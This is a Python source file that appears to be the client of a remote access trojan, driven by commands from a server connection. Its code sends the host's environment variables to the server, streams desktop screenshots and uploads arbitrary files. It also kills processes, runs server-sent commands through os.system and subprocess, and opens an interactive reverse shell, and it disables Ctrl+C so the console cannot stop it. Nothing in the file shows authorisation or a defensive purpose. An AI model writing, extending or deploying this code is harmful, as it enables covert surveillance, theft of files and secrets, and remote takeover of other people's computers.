import os
import platform
import signal
import threading
import time
import psutil
import subprocess

from PIL import ImageGrab

from client.net_client_service import NetClientService
from shared.net_lib.packets.packet import PacketType, PacketInformation, PacketDesktop, PacketFileSystem, PacketProcess, \
    PacketShell


class Application:
    def __init__(self):
        self.running = False
        self.net_client_service = NetClientService(self)
        self.streaming_desktop = False

        self.reverse_shell_process = None
        self.shell_out_reader = None
        self.reverse_shell_active = False

    def run(self):
        self.running = True
        self.catch_console_exit()
        self.net_client_service.start()

    def catch_console_exit(self):
        def ctrl_handler():
            pass

        signal.signal(signal.SIGINT, ctrl_handler)

    def on_packet_received(self, packet):
        if packet.packet_type == PacketType.PACKET_TYPE_INFORMATION:
            info = {
                'env': dict(os.environ),
                'py_version': platform.python_branch(),
                'arch': platform.architecture()[0],

            }
            packet = PacketInformation(info)
            self.net_client_service.send_packet(packet)
        elif packet.packet_type == PacketType.PACKET_TYPE_FILESYSTEM:
            self.handle_fs_packet(packet)

        elif packet.packet_type == PacketType.PACKET_TYPE_PROCESS:
            self.handle_ps_packet(packet)

        elif packet.packet_type == PacketType.PACKET_TYPE_DESKTOP:
            if packet.instruction == PacketDesktop.Actions.Play and not self.streaming_desktop:
                threading.Thread(target=self.stream_desktop).start()
            elif packet.instruction == PacketDesktop.Actions.Stop and self.streaming_desktop:
                self.streaming_desktop = False
        elif packet.packet_type == PacketType.PACKET_TYPE_SHELL:
            self.handle_shell_packet(packet)

    def stream_desktop(self):
        try:
            self.streaming_desktop = True
            while self.streaming_desktop:
                image = ImageGrab.grab()
                packet = PacketDesktop(image=image)
                self.net_client_service.send_packet(packet)
                time.sleep(1)
        except:
            self.streaming_desktop = False

    def handle_fs_packet(self, packet):
        path = packet.path
        if packet.fs_action == PacketFileSystem.Actions.List:
            if path is None or path.strip() == '' or path == '/':
                packet.path = None
                packet.list_dir = psutil.disk_partitions()
                self.net_client_service.send_packet(packet)
            elif type(path) == str:
                try:
                    if os.path.isfile(path):
                        self.send_file(path, packet)
                    else:
                        packet.list_dir = os.listdir(path)
                        self.net_client_service.send_packet(packet)
                except FileNotFoundError as err:
                    packet.success = False
                    packet.error_message = str(err)
                    self.net_client_service.send_packet(packet)

        elif packet.fs_action == PacketFileSystem.Actions.Download:
            self.send_file(path, packet)

    def send_file(self, path, packet=None):
        if path is not None:
            try:
                with open(path, 'rb') as fd:
                    packet.fs_action = PacketFileSystem.Actions.Download
                    packet.file_data = fd.read()
                    packet.filename = os.path.basename(path)

            except FileNotFoundError as exception:
                packet.success = False
                packet.error_message = str(exception)
        else:
            packet.success = False
            packet.error_message = 'Path can not be empty if you try to download a file'

        self.net_client_service.send_packet(packet)

    def handle_ps_packet(self, packet):
        if packet.ps_action == PacketProcess.Actions.Kill:
            try:
                process = psutil.Process(packet.pid)
                children_processes = process.children()
                for process_child in children_processes:
                    process_child.kill()
                process.kill()
            except psutil.AccessDenied as exception:
                packet.success = False
                packet.error_message = str(exception)
                self.net_client_service.send_packet(packet)

        elif packet.ps_action == PacketProcess.Actions.List:
            processes = []
            counter = 10
            for process in psutil.process_iter():
                try:
                    process_info = process.as_dict(attrs=['pid', 'name', 'cmdline', 'username'])
                    process_info['success'] = True
                    # at least on windows _exe returns the path for the process
                    process_path = getattr(process, '_exe', None)

                    if process is None:
                        cmdline = process.cmdline()
                        if len(cmdline) > 0:
                            process_path = os.path.abspath(process.cmdline()[0])

                    process_info['path'] = process_path

                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as exception:
                    if 'process_info' not in locals():
                        process_info = {}
                    process_info['success'] = False
                    process_info['error_message'] = str(exception)

                counter -= 1
                processes.append(process_info)
                # to speed up my testing let's only  take 10 processes
                if counter == 0:
                    break

            packet.processes = processes
            self.net_client_service.send_packet(packet)

    def handle_shell_packet(self, packet):
        command = getattr(packet, 'command', None)
        if packet.shell_action == PacketShell.Actions.Exec:
            # Execute command, skip response
            if command is not None:
                # subprocess.Popen(command) # run async
                os.system(command)  # run sync

        elif packet.shell_action == PacketShell.Actions.ExecPiped:
            # Execute command and get response
            command = getattr(packet, 'command', None)
            if command is not None:
                proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                output = proc.communicate()
                packet.data = output[0].decode()
                self.net_client_service.send_packet(packet)

        elif packet.shell_action == PacketShell.Actions.Interactive:
            if self.reverse_shell_active and command is not None:
                self.pipe_to_shell(command)
            elif not self.reverse_shell_active:
                # spawn shell
                self.spawn_shell()
                if command is not None:
                    # Pipe to shell
                    self.pipe_to_shell(command)

    def spawn_shell(self):
        # self.process.terminate() self.process.wait(timeout=0.5) self.process?.kill()
        shell_path = self.get_shell_path()
        if shell_path is None:
            packet = PacketShell(shell_action=PacketShell.Actions.Interactive)
            packet.shell_action = PacketShell.Actions.Stop
            packet.data = 'Could not find shell path'
            self.net_client_service.send_packet(packet)
            return

        self.reverse_shell_process = subprocess.Popen(shell_path,
                                                      shell=True,
                                                      stdout=subprocess.PIPE,
                                                      stderr=subprocess.STDOUT,
                                                      stdin=subprocess.PIPE)
        self.reverse_shell_active = True
        self.shell_out_reader = threading.Thread(target=self.read_shell_out)
        self.shell_out_reader.start()

    def read_shell_out(self):
        try:
            packet = PacketShell(shell_action=PacketShell.Actions.Interactive)
            while self.reverse_shell_active:
                buffer = self.reverse_shell_process.stdout.read1(1024)
                # https://stackoverflow.com/questions/43274476/is-there-a-way-to-check-if-a-subprocess-is-still-running
                # is_alive = process.poll() == None
                if buffer == b'' and self.reverse_shell_process.poll() is not None:
                    raise Exception('Process terminated')
                packet.data = buffer.decode()
                self.net_client_service.send_packet(packet)
        except Exception:
            if self.reverse_shell_active:
                # Unexpected shutdown, notify the server
                packet = PacketShell(shell_action=PacketShell.Actions.Stop)
                self.reverse_shell_process.stdin.close()
                self.reverse_shell_process.stdout.close()
                self.reverse_shell_active = False
                # packet.data = e.message
                self.net_client_service.send_packet(packet)

    def pipe_to_shell(self, command):
        if type(command) == str:
            command = command.encode()

        # We are only dealing with bytes
        if type(command) == bytes or type(command) == bytearray:
            if command.endswith(b'\n'):
                self.reverse_shell_process.stdin.write(command)
                self.reverse_shell_process.stdin.flush()
            else:
                self.reverse_shell_process.stdin.write(command + b'\n')
                self.reverse_shell_process.stdin.flush()

    @staticmethod
    def get_shell_path():
        operating_system = platform.system()
        if operating_system == 'Windows':
            return 'cmd'
        # elif operating_system == 'Linux':
        else:
            if os.path.isfile('/bin/sh'):
                return '/bin/sh'
            elif os.path.isfile('/bin/bash'):
                return '/bin/bash'
            else:
                return None
